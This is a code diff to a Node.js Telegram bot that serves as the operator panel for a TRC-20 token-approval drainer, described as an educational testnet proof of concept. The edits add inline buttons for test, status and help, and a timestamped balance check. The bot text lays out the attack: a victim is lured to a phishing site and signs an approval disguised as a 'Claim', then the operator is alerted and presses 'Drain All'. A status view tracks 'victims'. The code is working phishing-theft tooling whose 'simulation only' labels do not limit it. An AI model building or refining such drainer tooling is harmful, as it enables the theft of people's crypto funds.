@@ -40,37 +40,47 @@ async function readBalance(addr) {
   }
 }
 
-// ============ TELEGRAM COMMANDS ============
+// ============ TELEGRAM COMMANDS WITH INLINE BUTTONS ============
 
-// /start command
+// /start command - Shows a welcome message with command buttons
 bot.start((ctx) => {
   const message = 
     `🤖 *QR Drainer Bot - Educational PoC*\n\n` +
-    `Welcome! This bot monitors TRC-20 approval attacks on the Shasta testnet.\n\n` +
-    `*Commands:*\n` +
-    `/start - Show this message\n` +
-    `/test - Test bot connectivity\n` +
-    `/status - Show current victims\n` +
-    `/help - Show help\n\n` +
+    `This bot monitors TRC-20 approval attacks on the Shasta testnet.\n\n` +
+    `*How to use:*\n` +
+    `1. Victim connects wallet to the phishing site\n` +
+    `2. Victim clicks "Claim" (signs approve)\n` +
+    `3. You receive an alert here with their balance\n` +
+    `4. Click "Drain All" to execute the attack\n\n` +
     `⚠️ *SIMULATION ONLY* - No real funds involved.`;
   
-  ctx.reply(message, { parse_mode: 'Markdown' });
+  const keyboard = {
+    inline_keyboard: [
+      [
+        { text: '🧪 Test Bot', callback_data: 'cmd_test' },
+        { text: '📊 Status', callback_data: 'cmd_status' }
+      ],
+      [
+        { text: '📖 Help', callback_data: 'cmd_help' }
+      ]
+    ]
+  };
+
+  ctx.reply(message, { parse_mode: 'Markdown', reply_markup: keyboard });
   console.log('[BOT] /start command received');
 });
 
-// /test command
-bot.command('test', (ctx) => {
+// Handle command button clicks
+bot.action('cmd_test', (ctx) => {
   ctx.reply(
     `🔧 *Telegram test — SIMULATION*\n\n` +
     `The PoC backend is wired up. Approval + TEST SUCCESSFUL alerts will appear here.\n` +
     `No real funds are involved.`,
     { parse_mode: 'Markdown' }
   );
-  console.log('[BOT] /test command received');
 });
 
-// /status command
-bot.command('status', (ctx) => {
+bot.action('cmd_status', (ctx) => {
   if (victims.length === 0) {
     ctx.reply('📊 No victims yet. Waiting for approvals...');
   } else {
@@ -80,24 +90,20 @@ bot.command('status', (ctx) => {
     });
     ctx.reply(msg, { parse_mode: 'Markdown' });
   }
-  console.log('[BOT] /status command received');
 });
 
-// /help command
-bot.help((ctx) => {
+bot.action('cmd_help', (ctx) => {
   ctx.reply(
     `📖 *Help*\n\n` +
     `This bot demonstrates a TRC-20 approval drainer for educational purposes.\n\n` +
-    `*How it works:*\n` +
-    `1. Victim connects wallet to the phishing site\n` +
-    `2. Victim clicks "Claim" (actually signs approve)\n` +
-    `3. Bot receives alert with victim address\n` +
-    `4. Attacker clicks "Drain All" button\n` +
-    `5. Funds are transferred to attacker wallet\n\n` +
+    `*Commands:*\n` +
+    `/start - Show main menu\n` +
+    `/test - Test bot connectivity\n` +
+    `/status - Show current victims\n` +
+    `/help - Show this help\n\n` +
     `⚠️ *SIMULATION ONLY* - Shasta testnet mock tokens only.`,
     { parse_mode: 'Markdown' }
   );
-  console.log('[BOT] /help command received');
 });
 
 // ============ API ENDPOINTS ============
@@ -146,11 +152,14 @@ bot.action(/bal_(.+)/, async (ctx) => {
   await ctx.answerCbQuery('Reading...');
   try {
     const bal = await readBalance(addr);
+    const time = new Date().toLocaleTimeString();
+    
     await ctx.editMessageText(
-      `📊 *Balance check*\n👤 \`${addr}\`\n💰 **${fmt(bal)} mUSDT**`,
+      `📊 *Balance check (at ${time})*\n👤 \`${addr}\`\n💰 **${fmt(bal)} mUSDT**`,
       { parse_mode: 'Markdown' }
     );
   } catch (e) {
+    if (e.description && e.description.includes('message is not modified')) return;
     await ctx.editMessageText(`❌ Read failed: ${e.message}`);
   }
 });
